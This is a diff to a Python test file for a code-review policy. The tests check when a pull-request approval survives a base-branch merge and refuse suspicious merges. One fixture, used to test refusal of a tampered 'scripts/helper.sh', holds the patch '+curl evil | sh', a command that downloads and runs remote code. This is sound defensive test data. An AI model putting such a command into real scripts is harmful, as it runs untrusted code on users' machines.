@@ -217,6 +217,7 @@ HELD_PATCH = {
 
 def approval(state: str = "APPROVED", sha: str = OLD, user: int = 5) -> dict[str, object]:
     return {
+        "id": 41,
         "user": {"id": user, "login": f"user{user}", "type": "User"},
         "state": state,
         "commit_id": sha,
@@ -227,6 +228,67 @@ def approval(state: str = "APPROVED", sha: str = OLD, user: int = 5) -> dict[str
 HELPER = {"filename": "scripts/helper.sh", "status": "modified", "patch": "+x"}
 # main's tip commit, which its full ref resolves to.
 TIP = "3" * 40
+# The merge bases of the approved head and of the head with main's tip.
+MB_OLD = "1" * 40
+MB_HEAD = "2" * 40
+BASE_DOC = {"filename": "docs/base.md", "status": "modified", "patch": "+q"}
+# #10224's shape: main changed a file the pull request also changes, so the
+# net change moved by hunk headers while main's own hunk applies the same.
+SHARED = ".github/actions/collect-base-activity/collect-base-activity.test.mjs"
+SHARED_OLD = {"filename": SHARED, "status": "modified", "patch": "@@ -93 +93 @@\n+mine"}
+SHARED_HEAD = SHARED_OLD | {"patch": "@@ -98 +98 @@\n+mine"}
+SHARED_BASE = {"filename": SHARED, "status": "modified", "patch": "@@ -10 +10 @@\n+theirs"}
+# GitHub's stale-review dismissal on the base merge's push.
+STALE = {
+    "event": "review_dismissed",
+    "actor": {"login": "lanes[bot]", "type": "Bot"},
+    "dismissed_review": {
+        "review_id": 41,
+        "state": "approved",
+        "dismissal_message": None,
+        "dismissal_commit_id": HEAD,
+    },
+}
+
+
+def tree(*paths: str, flipped: str = "", truncated: bool = False) -> dict[str, object]:
+    """A recursive git/trees answer: each path a blob at mode 100644, but
+    `flipped` at 100755."""
+    return {
+        "truncated": truncated,
+        "tree": [
+            {"path": p, "mode": "100755" if p == flipped else "100644", "type": "blob"}
+            for p in paths
+        ],
+    }
+
+
+PATHS = (".github/actions/resolve-config/live-config.test.mjs", SHARED, "docs/base.md", "scripts/helper.sh")
+# The trees of the head and of its merge base with main's tip.
+TREES = {HEAD: tree(*PATHS), MB_HEAD: tree(*PATHS)}
+
+
+def ranges(
+    brought: list[dict[str, object]], based: list[dict[str, object]]
+) -> dict[str, object]:
+    """The compares OLD...HEAD (what the merges brought) and MB_OLD...MB_HEAD
+    (what main changed between the merge bases)."""
+    return {
+        f"{OLD}...{HEAD}": {
+            "status": "ahead",
+            "behind_by": 0,
+            "files": brought,
+            "commits": [{"sha": MAIN}, {"sha": HEAD}],
+            "total_commits": 2,
+        },
+        f"{MB_OLD}...{MB_HEAD}": {
+            "status": "ahead",
+            "behind_by": 0,
+            "files": based,
+            "commits": [{"sha": MB_HEAD}],
+            "total_commits": 1,
+        },
+    }
 
 
 def carried(
@@ -239,15 +301,24 @@ def carried(
     reads: list[str] | None = None,
     now_head: str = HEAD,
     changed: int | None = None,
+    across: dict[str, object] | None = None,
+    timeline: list[dict[str, object]] | None = None,
+    trees: dict[str, object] | None = None,
+    default_branch: str = "main",
+    now_repo: str = REPO,
 ) -> list[str]:
+    trees = TREES if trees is None else trees
+    across = ranges([BASE_DOC], [BASE_DOC]) if across is None else across
     compares = {
         OLD: {
             "files": [HELD_PATCH] if old_files is None else old_files,
+            "merge_base_commit": {"sha": MB_OLD},
             "commits": [{"sha": OLD, "parents": [{"sha": MAIN}]}],
             "total_commits": 1,
         },
         HEAD: {
             "files": head_files,
+            "merge_base_commit": {"sha": MB_HEAD},
             "commits": head_commits
             or [
                 {"sha": OLD, "parents": [{"sha": MAIN}]},
@@ -262,30 +333,50 @@ def carried(
             reads.append(endpoint)
         if endpoint == f"repos/{REPO}/pulls/{pr['number']}":
             count = len(head_files) if changed is None else changed
-            return 200, {"head": {"sha": now_head}, "changed_files": count}
+            head = {"sha": now_head, "repo": {"full_name": now_repo}}
+            return 200, {"head": head, "changed_files": count}
+        if endpoint == f"repos/{REPO}":
+            return 200, {"full_name": REPO, "default_branch": default_branch}
+        if "/git/trees/" in endpoint:
+            sha = endpoint.split("/git/trees/")[1].split("?")[0]
+            return (200, trees[sha]) if sha in trees else (404, None)
         if endpoint == f"repos/{REPO}/git/ref/heads/main":
             return 200, {"ref": "refs/heads/main", "object": {"sha": TIP}}
         if endpoint.endswith(f"...{TIP}"):
             parent = endpoint.rsplit("/", 1)[1].split("...")[0]
             return 200, {"status": "ahead" if parent == MAIN else "diverged"}
+        spec = endpoint.rsplit("/", 1)[1]
+        if spec in across:
+            return 200, across[spec]
         sha = endpoint.rsplit("...", 1)[1]
         assert endpoint == f"repos/{REPO}/compare/{TIP}...{sha}", endpoint
         return 200, compares[sha]
 
+    def paginated(endpoint: str, label: str, *args: object, **kwargs: object) -> object:
+        if reads is not None:
+            reads.append(endpoint)
+        assert endpoint.startswith(f"repos/{REPO}/issues/{pr['number']}/timeline"), endpoint
+        if timeline is None:
+            raise policy.PolicyReadError(label)
+        return timeline
+
     with mock.patch.object(policy, "_get", side_effect=get):
-        return policy.carried_lifters(
-            REPO, pr, [approval()] if reviews is None else reviews, TRUSTED
-        )
+        rows = [approval()] if reviews is None else reviews
+        if not any(r.get("state") == "DISMISSED" for r in rows):
+            return policy.carried_lifters(REPO, pr, rows, TRUSTED)
+        with mock.patch.object(policy, "_paginated", side_effect=paginated):
+            return policy.carried_lifters(REPO, pr, rows, TRUSTED)
 
 
 class ALiftCarriesOverABaseMerge(unittest.TestCase):
     def test_an_approval_before_a_base_merge_lifts_the_head(self) -> None:
         reads: list[str] = []
         self.assertEqual(carried([HELD_PATCH], reads=reads), ["user5"])
-        # The head is re-read, then the base once by its full ref; every
-        # compare names its tip.
+        # The head is re-read, the repository's default branch checked, then
+        # the base read once by its full ref; every compare names its tip.
         self.assertEqual(reads[0], f"repos/{REPO}/pulls/{CARRIED_PR['number']}")
-        self.assertEqual(reads[1], f"repos/{REPO}/git/ref/heads/main")
+        self.assertEqual(reads[1], f"repos/{REPO}")
+        self.assertEqual(reads[2], f"repos/{REPO}/git/ref/heads/main")
         self.assertIn(f"repos/{REPO}/compare/{TIP}...{OLD}", reads)
         self.assertFalse(any("compare/main" in r or r.endswith("...main") for r in reads))
         # A non-hold file the approved head changed, unchanged by the merge.
@@ -293,20 +384,126 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
             carried([HELPER, HELD_PATCH], old_files=[HELD_PATCH, HELPER]), ["user5"]
         )
 
+    def test_a_stale_dismissed_approval_carries(self) -> None:
+        """The owner's decision of 2026-10-28 (part a): an approval GitHub
+        dismissed as stale on the base merge's push counts through the carry."""
+        reads: list[str] = []
+        self.assertEqual(
+            carried(
+                [HELD_PATCH], reviews=[approval("DISMISSED")], timeline=[STALE], reads=reads
+            ),
+            ["user5"],
+        )
+        self.assertIn(f"repos/{REPO}/issues/{CARRIED_PR['number']}/timeline?per_page=100", reads)
+
+    def test_a_revoking_dismissal_does_not_carry(self) -> None:
+        dismissed = STALE["dismissed_review"]
+        cases = {
+            "a dismissal with a message": [STALE | {"dismissed_review": dismissed | {"dismissal_message": "stale"}}],
+            "a dismissal by a person": [STALE | {"actor": {"login": "user5", "type": "User"}}],
+            "a dismissal commit the merges did not push": [STALE | {"dismissed_review": dismissed | {"dismissal_commit_id": OTHER}}],
+            "a dismissal of another review": [STALE | {"dismissed_review": dismissed | {"review_id": 42}}],
+        }  # fmt: skip
+        for name, timeline in cases.items():
+            with self.subTest(name):
+                self.assertEqual(
+                    carried([HELD_PATCH], reviews=[approval("DISMISSED")], timeline=timeline),
+                    [],
+                )
+        # Approve the head, push X, force-push the head back: no range.
+        self.assertEqual(
+            carried([HELD_PATCH], reviews=[approval("DISMISSED", HEAD)], timeline=[STALE]),
+            [],
+        )
+
+    def test_10224s_shape_carries_when_the_merges_brought_exactly_mains_changes(
+        self,
+    ) -> None:
+        """The owner's decision of 2026-10-28 (part b)."""
+        reads: list[str] = []
+        replay = {
+            "old_files": [HELD_PATCH, SHARED_OLD],
+            "across": ranges([BASE_DOC, SHARED_BASE], [SHARED_BASE, BASE_DOC]),
+        }
+        self.assertEqual(
+            carried([HELD_PATCH, SHARED_HEAD], reads=reads, **replay), ["user5"]
+        )
+        self.assertIn(f"repos/{REPO}/compare/{OLD}...{HEAD}", reads)
+        self.assertIn(f"repos/{REPO}/compare/{MB_OLD}...{MB_HEAD}", reads)
+        self.assertEqual(
+            carried(
+                [HELD_PATCH, SHARED_HEAD],
+                reviews=[approval("DISMISSED")],
+                timeline=[STALE],
+                **replay,
+            ),
+            ["user5"],
+        )
+        self.assertIn(f"repos/{REPO}/git/trees/{HEAD}?recursive=1", reads)
+        self.assertIn(f"repos/{REPO}/git/trees/{MB_HEAD}?recursive=1", reads)
+        # The independent security review of #10671: modes come from the
+        # trees, and only a base that is the default branch carries.
+        refused = {
+            "a merge that also flips a base file's mode": {"trees": {HEAD: tree(*PATHS, flipped="docs/base.md"), MB_HEAD: tree(*PATHS)}},
+            "a truncated tree": {"trees": {HEAD: tree(*PATHS), MB_HEAD: tree(*PATHS, truncated=True)}},
+            "an unreadable tree": {"trees": {HEAD: tree(*PATHS)}},
+            "a base that is not the default branch": {"default_branch": "trunk"},
+            "a head re-read in a fork": {"now_repo": "a/fork"},
+        }  # fmt: skip
+        for name, case in refused.items():
+            with self.subTest(name):
+                self.assertEqual(carried([HELD_PATCH, SHARED_HEAD], **replay, **case), [])
+        self.assertEqual(carried([HELD_PATCH], default_branch="trunk"), [])
+        cases = {
+            "a merge that also edits a hold path": ranges([BASE_DOC, SHARED_BASE, HELD_PATCH | {"patch": "+evil"}], [BASE_DOC, SHARED_BASE]),
+            "a merge that also edits a non-hold file": ranges([BASE_DOC, SHARED_BASE, HELPER], [BASE_DOC, SHARED_BASE]),
+            "a base change reverted inside the merge": ranges([SHARED_BASE], [BASE_DOC, SHARED_BASE]),
+            "a range of 300 files": ranges(
+                [{"filename": f"d/{i}", "status": "added", "patch": "+x"} for i in range(300)],
+                [{"filename": f"d/{i}", "status": "added", "patch": "+x"} for i in range(300)],
+            ),
+        }  # fmt: skip
+        for name, across in cases.items():
+            with self.subTest(name):
+                self.assertEqual(
+                    carried(
+                        [HELD_PATCH, SHARED_HEAD],
+                        old_files=[HELD_PATCH, SHARED_OLD],
+                        across=across,
+                    ),
+                    [],
+                )
+
     def test_no_untrusted_shape_or_unread_input_carries(self) -> None:
         cases = {
-            "an evil merge": {"head_files": [HELD_PATCH | {"patch": "+evil"}]},
+            "an evil merge": {
+                "head_files": [HELD_PATCH | {"patch": "+evil"}],
+                "across": ranges([BASE_DOC, HELD_PATCH | {"patch": "+evil"}], [BASE_DOC]),
+            },
             # The re-review of #10596: a merge that rewrites a non-hold file
             # the approved head changed, or adds one the base touched.
             "a merge that rewrites scripts/helper.sh": {
                 "old_files": [HELD_PATCH, HELPER],
                 "head_files": [HELD_PATCH, HELPER | {"patch": "+curl evil | sh"}],
+                "across": ranges(
+                    [BASE_DOC, HELPER | {"patch": "+curl evil | sh"}], [BASE_DOC]
+                ),
             },
             "a merge that adds a file the base touched, with its own content": {
                 "head_files": [
                     HELD_PATCH,
                     {"filename": "scripts/lib.mjs", "status": "modified", "patch": "+evil"},
                 ],
+                "across": ranges(
+                    [
+                        BASE_DOC,
+                        {"filename": "scripts/lib.mjs", "status": "modified", "patch": "+evil"},
+                    ],
+                    [
+                        BASE_DOC,
+                        {"filename": "scripts/lib.mjs", "status": "modified", "patch": "+base"},
+                    ],
+                ),
             },
             "a merge whose second parent the base does not hold": {
                 "head_files": [HELD_PATCH],
@@ -335,8 +532,13 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
                 "head_files": [HELD_PATCH],
                 "pr": CARRIED_PR | {"head": CARRIED_PR["head"] | {"repo": None}},
             },
-            # The owner's decision on #10596: a dismissed approval never counts.
-            "a dismissed approval": {
+            # A dismissed approval counts only as GitHub's stale dismissal.
+            "a dismissed approval with no dismissal event": {
+                "head_files": [HELD_PATCH],
+                "reviews": [approval("DISMISSED")],
+                "timeline": [],
+            },
+            "a dismissed approval whose timeline does not read": {
                 "head_files": [HELD_PATCH],
                 "reviews": [approval("DISMISSED")],
             },
